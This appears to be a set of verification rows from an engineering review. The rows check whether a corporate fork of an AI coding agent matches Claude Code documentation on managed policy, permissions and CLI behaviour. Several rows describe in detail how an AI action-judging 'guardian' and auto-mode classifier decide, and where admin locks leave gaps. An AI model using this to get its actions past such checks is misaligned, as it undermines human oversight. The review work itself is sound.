column9: All three checks pass, and the consequence was reproduced by executing the shipped code rather than inferred.  (1) QUOTE VERBATIM. `curl -sL https://code.claude.com/docs/en/memory.md` line 101 reads exactly: "To pull in a README, package.json, and a workflow guide, reference them with `@` syntax anywhere in your CLAUDE.md:" — single-sentence line, nothing after the colon reverses it. The whole surrounding section supports the mid-line reading rather than a merely 'anywhere in the file' reading: :95 "CLAUDE.md files can import additional files using `@path/to/import` syntax"; :99 "Import parsing skips Markdown code spans and fenced code blocks. To mention a path in your CLAUDE.md without importing it, wrap it in backticks: writing `` `@README` `` keeps the text literal, while `@README` outside backticks imports the file." — i.e. ANY unfenced `@README` imports; and the fenced example at :104-107 is decisive, carrying TWO imports mid-sentence on one line ("See @README for project overview and @package.json for available npm commands for this project.") and one after a list bullet ("- git workflow @docs/git-instructions.md"). A third example at :116 is "- @~/.claude/my-project-instructions.md", also not line-initial.  (2) CITED LINE. packages/shared/src/agent/memory/memory-store.ts:49-64 is exactly as claimed: after the `@import ` prefix branch, `if (!trimmed.startsWith('@') || trimmed.startsWith('@@')) return null;` at :55-57, where `trimmed = line.trim()`. There is no regex scan of the line interior. `grep -ran parseMemoryImportPath` over the repo finds one definition and exactly three call sites: memory-store.ts:83 (readMemoryFileWithImports), capabilities/native-sources.ts:428 (memoryFileRecords import walker), agent/base-agent.ts:1005 (strips import lines from a memory layer's pinned body). All three inherit the line-start gate; there is no second, laxer parser.  (3) CONSEQUENCE, TESTED SEPARATELY. Ran the shipped exports under `bun test`. parseMemoryImportPath returns null for all three of the page's own examples — "See @README ... and @package.json ..." => null, "- git workflow @docs/git-instructions.md" => null, "- @~/.claude/my-project-instructions.md" => null — while "@AGENTS.md" => "AGENTS.md" and "  @docs/git-instructions.md" => "docs/git-instructions.md". The only recorded Nessy-specific behaviour here is the EXTRA `@import <path>` form at :51-53, which adds a shape rather than removing one. column9: The divergence survives all three challenges. One evidence detail is wrong and is corrected below; the conclusion is unaffected.  LEG 1 - QUOTE: CONFIRMED VERBATIM. `curl -sL https://code.claude.com/docs/en/admin-setup.md` (159 lines) -> line 91 is the 'Customization lockdown' row of the '## Managed settings' control table, and the middle cell reads character-for-character: 'Block skills, agents, hooks, and MCP servers from user and project sources, so they can only come from plugins or managed settings'. Read the WHOLE line: it is a three-column markdown row whose remaining cells are the link `[Customization lockdown](/docs/en/settings#strictpluginonlycustomization)` and the key name `strictPluginOnlyCustomization`, plus column padding. There is no second sentence and nothing reverses the conclusion. Cross-checked against the canonical spec: settings.md line 328 repeats the sentence with '(Managed settings only)' and adds '`true` locks all four surfaces; an array locks only the named ones'; settings.md:1162 '#### strictPluginOnlyCustomization' carries the per-surface table (skills -> blocks `~/.claude/skills/` and `.claude/skills/`, still loads plugin/bundled/managed-policy-dir skills; agents -> blocks `~/.claude/agents/` and `.claude/agents/`; hooks -> blocks user/project/local settings.json hooks; mcp -> blocks `~/.claude.json` and `.mcp.json`). So the CLAIMED BEHAVIOUR is an accurate restatement of the contract.  LEG 2 - CITED FILE:LINE: CONFIRMED. `packages/shared/src/agent/pi-harness/managed-policy.ts:501-534` is `export const MANAGED_PI_POLICY_KEYS`, exactly 34 entries: schemaVersion, disabledPermissionModes, permissionDsl, allowedPluginKeys, deniedPluginKeys, enabledPlugins, allowedMcpServers, deniedMcpServers, allowPluginHooks, allowManagedHooksOnly, disableAllHooks, allowManagedPermissionRulesOnly, defaultMode, channelsEnabled, allowedChannelServers, sandbox, workflow, allowedHttpHookUrls, httpHookAllowedEnvVars, claudeRules, autoMode, cleanupPeriodDays, autoCompactEnabled, connectSourcesOnStartup, env, forceRemoteSettingsRefresh, requiredMinimumVersion, requiredMaximumVersion, availableModels, enforceAvailableModels, strictKnownMarketplaces, extraKnownMarketplaces. `strictPluginOnlyCustomization` is not among them, and none of the 34 locks skill or agent ORIGIN. The claim's neighbouring-lock list is accurate as written: `allowManagedHooksOnly` (:177, :511), `allowManagedPermissionRulesOnly` (:203, :513), `allowedMcpServers`/`deniedMcpServers` (:129 ff., :508-509) all exist. (Note this is the one place f110 is MORE accurate than the sibling finding f017, which wrongly claimed we ship `allowManagedMcpServersOnly` - that name occurs only in six comments.)  LEG 2b - THE GREP CLAIM IS WRONG, THOUGH NOT FATALLY. `grep -rlaF strictPluginOnlyCustomization packages apps` returns FIVE files, not 'two vendored bundles under apps/electron/resources': packages/pi-agent-server/dist/index.js, apps/electron/dist/resources/pi-agent-server/index.js, apps/electron/dist/resources/session-mcp-server/index.js, apps/electron/resources/pi-agent-server/index.js, apps/electron/resources/session-mcp-server/index.js. Each contains the string exactly ONCE, and every one is gitignored build output (`git check-ignore -v` -> .gitignore:7:dist for three, .gitignore:11 and :12 for the two under apps/electron/resources). The single occurrence is a vendored Claude zod schema field - `preprocess(...) union([boolean, array(enum(["skills","agents","hooks","mcp"]))]).optional().catch(undefined)` - declared and never read by name, so nothing enforces it there either. First-party source is genuinely 0: `grep -ran strictPluginOnlyCustomization --include=*.ts --include=*.tsx --include=*.json packages/*/src apps/*/src` returns nothing.  LEG 3 - ONE LAYER UP: NO UPSTREAM HANDLER. There is no second managed surface that could absorb the key. `refuseUnknownKeys` (managed-policy.ts:727-733) drops any key outside MANAGED_PI_POLICY_KEYS with disposition 'stripped', so an admin document carrying `strictPluginOnlyCustomization` is silently degraded (surfaced only by `nessy-general-agent doctor`). `managed-composition.ts` records no counterpart for it. The plugin-scope keys (`allowedPluginKeys`, `deniedPluginKeys`, `enabledPlugins`) narrow WHICH PLUGINS load; they never touch user- or project-sourced skills and agents.  LEG 3 - ONE LAYER DOWN: THE CONSEQUENCE IS INDEPENDENTLY TRUE, AND THE SUBSYSTEM IS NAMED CORRECTLY. The surfaces the doc names really do exist here and really are unlocked. Skills: `packages/shared/src/skills/storage.ts` merges three native tiers - global `GLOBAL_AGENT_SKILLS_DIR` (:473), workspace `loadWorkspaceSkills` (:478), project `.agents/skills` via `PROJECT_AGENT_SKILLS_DIR` (:37, :485, :523) - then folds plugin skills in via `mergePluginSkills` (:494). The ONLY gate on the project tier is `if (projectRoot && projectTrusted)` (:484), i.e. the per-user project-trust consent flow - a user decision, which is precisely the decision this admin key exists to take away. Agents: `packages/shared/src/capabilities/project-contribution-detect.ts:215` detects project subagents from `.claude/agents` (alongside `.nessy-agent/skills` at :212, `.claude/commands` :218, `.claude/hooks` :221, `.claude/settings.json` :224), again gated only by project trust. So there is no 'the identifier is unwired but the consequence is already handled upstream' escape, and no sibling-subsystem mix-up: the finding names skills and agents, and skills and agents are exactly what is unlocked.  OWNER-DECISION CHECK - NOT ONE OF THE NINE. docs/superpowers/specs/2026-07-29-inert-worklist.md section 3 lists SEATBELT_TESTING_WILDCARD, availableModels/enforceAvailableModels, autoMode.classifyAllShell, ManagedDeliveryStateV1.drops, plugins/hooks-runtime.ts, SdkMcpServerConfig.required, SessionMirrorStore.delete, MirrorSessionKey.subpath/listSubkeys, and listSessionSummaries/listSessions. `strictPluginOnlyCustomization` appears in none of them. The fork invests heavily in exactly this surface - a 34-key managed Pi policy with `allowManagedHooksOnly`, `disableAllHooks`, `allowManagedPermissionRulesOnly`, `strictKnownMarketplaces`, `sandbox.filesystem.allowManagedReadPathsOnly`, `sandbox.network.allowManagedDomainsOnly` - so a missing admin lock here is a gap in a surface we are deliberately building.  PRIOR REGISTRATION - PARTIAL ONLY. docs/architecture/managed-mcp-access.md:95 files ONLY the `mcp` surface under 'What we do not implement', category 'documented, not implemented - a settings key we do not carry', reason 'A different mechanism (plugin-only customization) that happens to appear in the same pattern table' - an out-of-scope-for-that-unit note, not a reasoned decision to never implement. docs/superpowers/plans/2026-07-28-rules-tier.md:34 notes only that the key has no `rules` surface. docs/architecture/unified-plugin-adapter-runtime.md:200 mentions it only to argue our granularity is finer. docs/superpowers/specs/2026-07-26-r-queue-doc-verification.md:46 and :559 (R30) list it as unimplemented. It is in neither 2026-07-29-deviation-register.md nor 2026-07-30-parity-report.md. The skills and agents halves have no owner ruling anywhere.  DUPLICATE NOTE. This is the same underlying gap as verdict f017 (slug `permissions`, also refuted=false), which found it via permissions.md line 507. admin-setup.md line 91 is a second, independent doc page carrying the same contract. f110's OUR STATE text is the more accurate of the two on the neighbouring locks; f017's is the more accurate on the grep count. column5: Prevent auto-update from installing below an org-wide minimum

column7: We implement `requiredMinimumVersion`/`requiredMaximumVersion` (refuse to start outside the range) but not `minimumVersion`. Our own gate comment names the difference and stops there, so a managed fleet with an auto-update feed has no floor on what the updater may install.
column9: Doc quote and identifier both check out; the CONSEQUENCE is false, which is this repo's documented recurring false positive (inert-worklist section 4, shape 3: 'enforcement one layer up'). (1) VERBATIM: admin-setup.md:97 is the table row '| [Version floor](/docs/en/settings) | Prevent auto-update from installing below an org-wide minimum | `minimumVersion` |'. Whole line read, nothing reverses it; :98 confirms requiredMinimumVersion is the stronger sibling. (2) IDENTIFIER: managed-version-gate.ts:12 does say 'Differs from `minimumVersion`, which prevents downgrades but never blocks startup', and MANAGED_PI_POLICY_KEYS (managed-policy.ts:501-534) carries requiredMinimumVersion/requiredMaximumVersion and no `minimumVersion`. `grep -rna minimumVersion` over the repo finds no reader anywhere except that one comment. Both required* keys ARE enforced, on both surfaces: apps/electron/src/main/index.ts:1102 and packages/server-core/src/bootstrap/headless-start.ts:645 both call assertManagedVersionAllowed (headless-start.ts:117). (3) CONSEQUENCE 'a managed fleet with an auto-update feed has no floor on what the updater may install' is FALSE. The updater is electron-updater 6.8.9 (apps/electron/src/main/auto-update.ts). `allowDowngrade` is left at its default false (node_modules/electron-updater/out/AppUpdater.js:138) and `autoUpdater.channel` is never assigned anywhere in apps/electron/src -- the channel setter (AppUpdater.js:44) is the only thing that would silently flip allowDowngrade to true. AppUpdater.js:362 returns `this.allowDowngrade && isLatestVersionOlder`, so a feed entry below the running version is rejected outright, logged at :405 as 'downgrade is disallowed'. There IS a floor on what the updater may install, it is hard, and it cannot be lowered by a user: the currently-running version. (4) The scenario the setting exists for cannot arise here. settings.md:294 defines minimumVersion as the pin created when a user switches from the `latest` channel to `stable` via /config and elects to stay put ('Choosing to stay sets this value'), with managed use as a secondary note. Our update channel is baked into app-update.yml at build time from NESSY_DESKTOP_UPDATE_CHANNEL (apps/electron/electron-builder.yml:80); there is no runtime channel switcher and no `claude update <version>` equivalent, so no in-product path can request an older version in the first place. Not one of the nine inert-worklist section 3 owner decisions (checked; they cover the seatbelt wildcard, availableModels, classifyAllShell, delivery drops, hooks-runtime, SdkMcpServerConfig.required and three session-mirror rows). Note also that the plans' earlier answer at 2026-07-28-managed-policy-tolerance.md:302 ('We carry none') is stale for the two required* keys, which shipped after it.

column9: Step 1 passes: the sentence is verbatim at admin-setup.md line 64, third of three sentences on that line, and nothing in the first two reverses it. Step 2 and step 3 fail. (a) The cited lines drift: fallbackModel sits at packages/shared/src/config/storage.ts:194 (not :189) and PiAgent.getFallbackModel at packages/shared/src/agent/pi-agent.ts:6256-6258 (not :6234). Only the absence claim is exact -- MANAGED_PI_POLICY_KEYS at packages/shared/src/agent/pi-harness/managed-policy.ts:501-534 does carry availableModels and enforceAvailableModels and does not carry fallbackModel. (b) The load-bearing half of the claimed our-state is false. fallbackModel does NOT live in 'user-editable workspace defaults'. ~/.nessy-agent/config-defaults.json is overwritten from the app bundle's apps/electron/resources/config-defaults.json on EVERY launch -- syncConfigDefaults, storage.ts:198-226, comment at :160 'Always writes on launch to ensure defaults are up-to-date with the running version' -- and writeFileSync(CONFIG_DEFAULTS_FILE, ...) at :209/:218/:225 is the only writer in the repo. A grep -a over apps/ and packages/ for fallbackModel returns no setter, no RPC handler, no renderer control, no i18n label and no per-workspace override; the only production reader is getFallbackModel. So a user cannot set it at all, and a hand-edit of the JSON is clobbered at next start. (c) Verifying the consequence separately from the identifier, per the repo's own recurring-false-positive shape: 'an admin cannot pin the fallback' does not hold in the sense the sentence guards. The doc exception exists because fallbackModel is an ARRAY that would otherwise merge -- settings.md:277, 'Unlike most array settings, this key does not merge across settings files: the highest-precedence file that defines it supplies the entire chain.' Our value is a scalar with exactly one source and no lower layer, so 'the managed value replaces lower layers rather than merging' is already trivially the effective behaviour, and the value is in fact pinned harder than Claude's model allows -- fixed by the shipped bundle and re-asserted every launch, unoverridable by any user. The genuine residue is much narrower than the claim: the key cannot be changed through the managed-policy channel without rebuilding. And that residue rides on a shape mismatch already recorded three times -- f106, f226, f242 all file our scalar single-retry knob against Claude's ordered three-model chain. f113 restates that same underlying divergence against a precedence sentence that cannot bite a single-source scalar. Not one of the nine inert-worklist section 3 owner decisions: item 2 there covers availableModels/enforceAvailableModels enforcement placement, not fallbackModel. Refuted on the evidence, not as a recorded decision.

column9: Step 1 PASSES: curl -sL https://code.claude.com/docs/en/accessibility.md line 114 carries the quoted sentence verbatim, as a one-sentence bullet under '## Accessibility settings beyond screen reader mode' with no second clause that reverses it. (a) 'sole source-tree occurrence' / 'the only prefers-reduced-motion media query in the whole source tree' is false: apps/webui/src/login.html:189 is a second literal '@media (prefers-reduced-motion: reduce)' block, killing the body::before drift animation and the button hover transform/filter. column9: All three checks confirm the finding.  (1) QUOTE VERBATIM. curl -sL https://code.claude.com/docs/en/amazon-bedrock.md, line 433 (of 551), under '## Use the Mantle endpoint': "Mantle is an Amazon Bedrock endpoint that serves Claude models through the native Anthropic API shape rather than the Amazon Bedrock Invoke API. (The SDK's sdk.mjs/bridge.mjs mention it only to suppress error reporting under a cloud provider, which is itself evidence the flag is a live provider selector.)  (6) ONE LAYER UP. The strip is duplicated, and the duplicate is equally incomplete: packages/shared/src/config/llm-connections.ts:931-935 defines CLAUDE_BEDROCK_ROUTING_ENV_KEYS (the same three), consumed by clearClaudeBedrockRoutingEnvVars() at claude-agent.ts:917 in postInit ('Claude subprocesses must never inherit Bedrock-routing toggles from a previous connection or parent process environment') and folded into MANAGED_ANTHROPIC_AUTH_ENV_KEYS. column9: Checks 1 and 2 pass; check 3 kills it. (1) The quote is VERBATIM at authentication.md:143, and the whole two-line neighbourhood supports the claimed behaviour: :144 is 'by default, `apiKeyHelper` is called after 5 minutes or on HTTP 401 response. Set `CLAUDE_CODE_API_KEY_HELPER_TTL_MS` environment variable for custom refresh intervals.' Nothing in the second half reverses it. (2) The cited file says what was claimed: resolveAuthEnvVars (packages/shared/src/config/llm-connections.ts:1021-1076) assembles ANTHROPIC_API_KEY / CLAUDE_CODE_OAUTH_TOKEN / ANTHROPIC_BASE_URL and has no helper path. (3) The CONSEQUENCE is false, and it is the archetypal shape this repo keeps hitting -- the identifier is genuinely absent from first-party TypeScript while the mechanism is live one layer down, because the claimed grep was scoped to packages/ and apps/ and therefore excluded the dependency that IMPLEMENTS it. The native Claude Agent SDK binary contains apiKeyHelper's full runtime -- `grep -c -a CLAUDE_CODE_API_KEY_HELPER_TTL_MS node_modules/@anthropic-ai/claude-agent-sdk-darwin-arm64/claude` returns 7 (the JS core returns 0), and the binary carries the doc's own strings 'apiKeyHelper is taking a while', 'apiKeyHelper failed', 'apiKeyHelper is configured'. That binary is staged into the shipped app (scripts/build/common.ts:324-371 aliases claude-agent-sdk-darwin-<arch> to @anthropic-ai/claude-agent-sdk-binary; apps/electron/scripts/build-dmg.sh:169-189 and build-linux.sh:147 do the same). And our own code opens every seam the helper needs, deliberately: buildClaudeTurnShapeOptions passes settingSources: ['user','project','local'] explicitly (packages/shared/src/agent/claude-agent.ts:305, with the comment 'Omitting this loads all three sources (CLI defaults). Spelling out the same three keeps today's behavior'), so an apiKeyHelper entry in a project .claude/settings.json, .claude/settings.local.json, or the per-Workspace user scope under CLAUDE_CONFIG_DIR (packages/shared/src/agent/options.ts:222-255) is read by the CLI; buildClaudeSubprocessEnv (options.ts:236-263) spreads the entire host process.env and deletes only three Bedrock keys, so CLAUDE_CODE_API_KEY_HELPER_TTL_MS propagates unmodified -- 'no CLAUDE_CODE_API_KEY_HELPER_TTL_MS' is true of our source and false of our runtime; and addClaudePermissionRules (packages/shared/src/agent/claude-settings-store.ts:118-164) merge-preserves unknown keys, so nothing we write strips the entry. The one real difference is precedence, and it is the SAME page's documented precedence working as specified, not a gap: for an anthropic connection with authType 'api_key' we inject ANTHROPIC_API_KEY (llm-connections.ts:1042-1045), which authentication.md:170 ranks 3rd, above apiKeyHelper at 4th, so the helper is shadowed there; on authType 'oauth' we inject CLAUDE_CODE_OAUTH_TOKEN (llm-connections.ts:1057), rank 5, which apiKeyHelper OUTRANKS, so a vault-backed helper does supply the credential. isValidProviderAuthCombination limits anthropic to ['api_key','oauth'] (llm-connections.ts:801). The sibling-subsystem trap also applies to the closing sentence: authentication.md governs the Claude CLI's credential resolution, so measuring it against the Nessy Gateway dp flow and NESSY_DP_AUTH_TOKEN names the wrong subsystem -- the Pi / Codex / Nestor paths are the fork's deliberate corporate-gateway product difference, not this page's contract. column5: Auto mode allows pushes to any branch of the repository you're working in, including the default branch, and pull request creation by default.
column6: Pushes to any branch of the repository you are working in, including the default branch, are allowed by default; the protected-branch default was removed.
column7: Our classifier prompt still carries the removed boundary: it instructs the judge to keep git actions 'high or critical if they touch a protected/default branch', and a high-risk verdict denies unless user authorization is at least medium. A routine push to main/master is therefore escalated where the documented default allows it. The `protectedBranch` fact the rule keys off has no producer either, so the rule fires on the model's own inference of what 'default branch' means.
column8: packages/shared/src/prompts/guardian.ts:171 (rule text), :186 (high-risk verdict rule), :226 (protectedBranch fact, declared and rendered, never set)
column9: Quote verified verbatim at auto-mode-config.md:31, but it is the first of four sentences on that line and the rest reverses the reading: deploy/publication-target branch names are still judged on their own terms, and force pushes plus secret-bearing pushes stay blocked. Line 33 adds that even BEFORE v2.1.211 the classifier already allowed 'routine pushes to the default branch'. What v2.1.211 actually removed (line 101) is a CONTEXT SLOT named 'Default / protected branches' in the autoMode config, not a risk rule. Refuted on four grounds. (1) We never had that slot: AUTO_MODE_KEYS at packages/shared/src/agent/pi-harness/managed-policy.ts:469 is exactly ['environment','hard_deny','soft_deny','allow'] and no protected-branch config surface has ever existed here, so there is no removed default 'still carried'. (2) Wrong subsystem. packages/shared/src/prompts/guardian.ts is NOT a port of Claude's auto-mode rule lists; its header (lines 1-30) and docs/architecture/guardian-command-judge.md:1-7 record that the risk taxonomy, authorization scoring, base risk levels and outcome thresholds are 'adapted VERBATIM where they fit from the openai/codex guardian policy (codex-rs/core/src/guardian/policy.md + policy_template.md, Apache-2.0)'. Lines 171 and 186 are that Codex text, adopted under the AGENTS.md rule permitting verbatim adaptation of permissively licensed upstream prompt text. Claude's own four rule lists reach the same prompt through a separate channel, GuardianOrgPolicy rendered by describeOrgPolicy (guardian.ts:332+) with exactly the four-tier precedence the page states at doc lines 172-178. (3) The consequence is false for the case it names. In auto mode the guardian is consulted ONLY when the deterministic gate already returned 'prompt' (pi-agent.ts:4048-4051; guardian-command-judge.md:28-34), and 'git push' is in DANGEROUS_COMMANDS (permission-manager.ts:49), so pre-guardian Nessy asks for EVERY push, main or feature. The guardian can only convert a would-ask into allow or block; it cannot escalate anything already allowed. For a routine push the user asked for it, so authorization scoring (guardian.ts:135) is 'high'; rule :186 reads 'risk high -> no_objection only when user authorization is at least medium and the action is narrowly scoped with no deny rule', and the Destructive deny rule at :173 requires 'no proof of user authorization'. Verdict: no_objection -> allow. The routine push is not escalated; the guardian is what lets it through WITHOUT a prompt. A deny needs low/unknown authorization, i.e. agent drift, which doc line 178 also treats as unauthorized. (4) protectedBranch:226 does have no production producer - both GuardianJudgeInput.facts sites (pi-agent.ts:3417-3421 and :3523-3527) set only mode and workspaceRoot - but that WEAKENS the finding: describeFacts (:322-328) gates the '(PROTECTED/default branch)' note on facts.gitBranch, which is also never set, so the note is never rendered in production and the judge's prompt never asserts a protected branch at all. Only the tests set either field.

column5: A developer can extend `environment`, `allow`, `soft_deny`, and `hard_deny` with personal entries but can't remove entries that managed settings provide.
column6: The classifier reads autoMode from the developer's own ~/.claude/settings.json in addition to managed settings, and a developer may extend the four lists with personal entries.
column7: resolveAutoMode accepts a `user` scope and composes it correctly, but the single production call site passes only `managed`, and so do both classifyAllShell call sites. There is no reader that puts a user-settings autoMode block into that parameter, so a developer's personal trusted-infrastructure entries can never reach the classifier.
column9: All three factual legs of the finding hold, but it is a RECORDED DECISION with a written reason plus a deliberate corporate-fork posture, and it names the wrong subsystem's file. (1) QUOTE: verbatim at auto-mode-config.md:74. The whole line is two sentences and the second does NOT reverse the conclusion - it weakens it in our favour: 'Because allow rules act as exceptions to soft block rules inside the classifier, a developer-added `allow` entry can override an organization `soft_deny` entry: the combination is additive, not a hard policy boundary.' The doc itself says wiring the user scope makes the org policy a soft boundary. (2) CODE: accurate. resolveAutoMode (managed-policy.ts:1082-1101) composes managed-then-user; the single production call site SessionManager.ts:4109 passes `{ managed: this.managedPiPolicy.autoMode }` only, and both resolveAutoModeClassifyAllShell sites (:4119, :16269) do the same. The source comments state the restriction outright ('MANAGED scope only'). managed-policy.test.ts:1033-1041 pins that the user scope composes correctly when supplied. (3) CONSEQUENCE, verified separately: true at the Pi guardian - no user-scope autoMode reaches buildGuardianJudgeTask, whose GuardianJudgeInput.orgPolicy is documented as 'resolved from the HOST-OWNED managed policy file'. REFUTATION GROUNDS: (a) RECORDED DECISION, dated and categorized. docs/superpowers/plans/2026-07-30-managed-policy-honesty.md:207, category 'ours, stated': 'classifyAllShell is read from the MANAGED scope only, because no user autoMode scope is wired in this product and a checked-in repo must not steer the classifier band. The composer accepts a user scope and nothing supplies one.' That last clause is verbatim the fact this finding reports. The two classifyAllShell call sites it cites are additionally covered by inert-worklist §3 item 3 ('autoMode.classifyAllShell / resolveAutoModeClassifyAllShell'). (b) WRONG SUBSYSTEM, the AGENTS.md trap-4 shape. The finding says the classifier should read '~/.claude/settings.json'. In this fork that file is a CLAUDE AGENT SDK BACKEND surface (packages/shared/src/agent/claude-settings-store.ts, destination 'userSettings'), consumed by the real Claude Code subprocess via settingSources - a different subsystem from the Pi-harness guardian judge, which the autoMode wiring is gated to (`snapshot.context.provider === 'pi'` at SessionManager.ts:4108/:4119). And on THAT backend the user scope is also excluded by a separate recorded decision: options.ts:202-210 redirects CLAUDE_CONFIG_DIR per-Workspace so 'a hand-written ~/.claude/settings.json stops reaching the subprocess. It is the change the isolation is FOR - a user-scope Claude settings file is a cross-Workspace policy channel'. The Claude provider is also off by default (NESSY_FEATURE_PROVIDER_CLAUDE). (c) DELIBERATE PRODUCT DIFFERENCE. This is a bank fork. `autoMode` exists ONLY as a field of ManagedPiPolicyV1, parsed only from the root-owned system file (managed-policy-loader.ts:44-56: /Library/Application Support/Nessy/managed-policy.json, /etc/nessy/, %ProgramData%/Nessy/, with uid==0 and (mode & 0o022)==0 enforced). Given the doc's own second sentence, wiring a user scope would let a developer's `allow` line override the bank's `soft_deny`. Our posture is strictly tighter than Claude's, which is the direction this fork takes everywhere. HONEST RESIDUALS, neither changing the verdict: (i) the finding's 'CLAIMED OUR STATE' understates the situation - it reads as if only the wiring is missing, but there is no user-scope autoMode SURFACE at all (no config key, no schema entry, no parser, no RPC, no UI; `grep -ran autoMode` over packages/ and apps/ returns ManagedPiPolicyV1 and its consumers only), so this is an absent scope by design, not an unwired parameter; (ii) the recorded reason at managed-policy-honesty.md:207 is partly mis-argued - 'a checked-in repo must not steer the classifier band' justifies excluding the PROJECT scope (which the doc also excludes, and which resolveAutoMode discards on purpose), not the USER scope, since ~/.claude/settings.json is not in the repo; the real justification is the corporate-boundary posture above; (iii) inert-worklist §3 item 3's stated reason ('the band that would honour it does not exist yet') is now STALE - the band shipped as D1 and is production-reachable at pre-tool-use.ts:2160 via SessionManager.ts:4119 -> pi-agent.ts:3835. Worth a separate housekeeping row.

The whole line is two sentences and the second reinforces rather than reverses ('Press `r` on a denied action to mark it for retry: when you exit the dialog, Claude Code sends a message telling the model it may retry that tool call and resumes the conversation.'). It is NOT one of the nine dated owner decisions in 2026-07-29-inert-worklist.md section 3 -- I checked all nine; the nearest neighbour is #3, autoMode.classifyAllShell, a different key. (3) THE CONSEQUENCE IS OVERSTATED, which is this repo's named recurring false-positive shape. Denials ARE recorded, and a human CAN clear one: GuardianConsultState keeps a session-scoped bounded (GUARDIAN_DENIED_SET_MAX = 200, LRU-on-write) set of every (action, cwd) the judge denied (packages/shared/src/agent/core/guardian-consult.ts:139, recordDenied :193-200), and pi-agent.ts:4650-4658 arms guardian.recordPostDenialOverride whenever the user approves at a prompt an action the guardian denied earlier in the session -- that exact action is then never re-consulted. That is a user-facing review-and-allow of a prior denial; what is missing is only the USER-INITIATED browse-a-list-and-press-r shape, since the override is reached when the model re-attempts and the action lands at a prompt. The PermissionDenied `{retry:true}` hook the finding concedes is indeed live and bounded to MAX_PERMISSION_DENIED_RETRIES = 1 per tool call (pi-agent.ts:370, 4438-4470), with the matcher arm present (automations/utils.ts:173). Absence itself verified with `grep -rain` (NUL-safe) for 'recently denied' / recentlyDenied / recently-denied / denialHistory / deniedHistory / denialLog / markForRetry / retryDenied across packages/ and apps/: zero source hits, only the sweep's own JSON/markdown rows. column9: All three checks pass; the finding survives.  1. QUOTE — verbatim. `curl -sL https://code.claude.com/docs/en/best-practices.md` line 469 (of 610), under `### Run non-interactive mode`, reads in full: "With `claude -p \"your prompt\"`, you can run Claude non-interactively, without an interactive prompt. The run still creates a resumable session unless you pass `--no-session-persistence`. [Non-interactive mode](/docs/en/headless) is how you integrate Claude into CI pipelines, pre-commit hooks, or any automated workflow. The output formats let you parse results programmatically: plain text, JSON, or streaming JSON." Four sentences on one line; none of the later three reverses the second. Corroborated on a second page: `cli-reference.md:103` — "`--no-session-persistence` | Disable session persistence so sessions are not saved to disk and cannot be resumed. Print mode only. The `CLAUDE_CODE_SKIP_PROMPT_HISTORY` environment variable does the same in any mode". So upstream's default is persist, and discard is the opt-in, exactly as claimed. (`headless.md` does not name the flag, but documents `--resume`/`--continue` against a `-p` run's session at `:278`, which presupposes persistence.)  2. CITED STATE — confirmed, one trivial line-number slip. `apps/cli/src/index.ts:788` reads `if (sessionId && client?.isConnected && !args.noCleanup) { await client.invoke('sessions:delete', sessionId).catch(() => {}) }` inside `cleanup()`, which `cmdRun` calls on the success path (`:853`), the catch path (`:858`) and on SIGINT/SIGTERM (`:800`). `noCleanup` is parsed only from `--no-cleanup` (`:113-114`, declared `:37`, defaulted `false` at `:66`). Help text is at `:2052`, not `:2051` — off by one, immaterial. `docs/cli.md:168` documents the same inversion: "`--no-cleanup` | `false` | Skip session deletion on exit". `--no-session-persistence` and `sessionPersistence` appear nowhere in the fork's source (`grep -ran` across `packages` and `apps`, NUL-safe): the only repo hits are this sweep's own JSON under `docs/superpowers/specs/data/`.  3. ONE LAYER UP AND DOWN — consequence verified separately, and it holds.    - UP (is `run` really the `-p` analogue?): yes, and the fork says so itself. `apps/cli/src/index.ts:616-618` comment: "`run` is our non-interactive `-p` mode, and the agent subprocess is where the wait actually happens"; `spawnLocalServer(args, { printMode: true })` at `:782` sets `PRINT_MODE_ENV_VAR`. Not a wrong-subsystem match.    - DOWN (does the delete actually destroy resumability, or is something downstream soft-deleting?): no soft delete. `SessionManager.deleteSession` (`packages/server-core/src/sessions/SessionManager.ts:14920`) fences the persistence queue, then `if (this.sessionStore.delete(sessionKey) === false) throw new Error('session-storage-delete-failed')` at `:14950-14952` — durable storage removal, with a rollback path that re-persists only when the storage delete never committed. It also emits `session_deleted`. The CLI spawns the server with no temp config dir (`apps/cli/src/server-spawner.ts` has no `NESSY_CONFIG_DIR`/`mkdtemp`), so the session lived in the user's real store before being removed.    - And resumption is a real capability the default throws away: `send <id> <message>` ("Send message and stream AI response", help `:2077`) plus `sessions` / `session messages <id>` continue a kept session. So `--no-cleanup` is genuinely the persistence opt-in. (Separately, the fork has no `--resume`/`--continue` on `run` at all — `grep -an 'resume' apps/cli/src/index.ts` returns nothing — which is a wider gap than this row claims, not a narrower one.)  NOT an owner decision: `docs/superpowers/specs/2026-07-29-inert-worklist.md` §3's nine dated decisions are SEATBELT_TESTING_WILDCARD, availableModels/enforceAvailableModels, autoMode.classifyAllShell, ManagedDeliveryStateV1.drops, plugins/hooks-runtime.ts, SdkMcpServerConfig.required, SessionMirrorStore.delete, MirrorSessionKey.subpath/listSubkeys, and listSessionSummaries/listSessions. None touches CLI session cleanup. NOT a deliberate product difference either: it is not a subscription flow, not gateway-scoped, and not a rename — the flag *name* differs, but a rename cannot explain an inverted *default*. `git log -L 786,792:apps/cli/src/index.ts` shows the block arrived unchanged in the baseline import commit `845cf0a4`, i.e. inherited upstream behaviour, with no recorded rationale anywhere in `docs/`.

(1) QUOTE: verbatim at best-practices.md:532, second sentence of a two-sentence line ('Refine your prompt based on what goes wrong with the first 2-3 files, then run on the full set. The `--allowedTools` flag restricts what Claude can do, which matters when you're running unattended.'); the first sentence does not reverse it. (2) CITED LINE: apps/cli/src/index.ts:842 reads exactly as claimed, and `grep -an 'allowedTools|allowed-tools'` over apps/cli/src returns 0 hits — no such flag; the 24 parsed flags are --url --token --workspace --timeout --json --tls-ca --send-timeout --source --mode --output-format --json-schema --no-cleanup --disable-spinner/--no-spinner --verbose --safe-mode --server-entry --workspace-dir --provider --model --api-key --base-url --help --version --validate-server. bypassPermissions is indeed the widest mode (PERMISSION_MODE_ORDER, mode-types.ts:63). (3) CONSEQUENCE — REFUTED. An enforced tool allowlist with exactly the semantics the sentence describes DOES exist and it outranks bypass. `checkToolPermission` (packages/shared/src/agent/mode-manager.ts) evaluates, IN THIS ORDER: deniedPaths :2094, deniedToolPatterns :2103, disallowedTools :2111, `config.allowedTools` :2119-2127 ('Tool blocked: <tool> is not included in allowedTools') and deny/ask toolRules :2129-2157 — and ONLY THEN, at :2161, does `if (mode === 'bypassPermissions') return { allowed: true }`. A non-empty allowedTools list therefore blocks every tool off it even in bypassPermissions. Those lists come from permissions.json layers that the merged config assembles 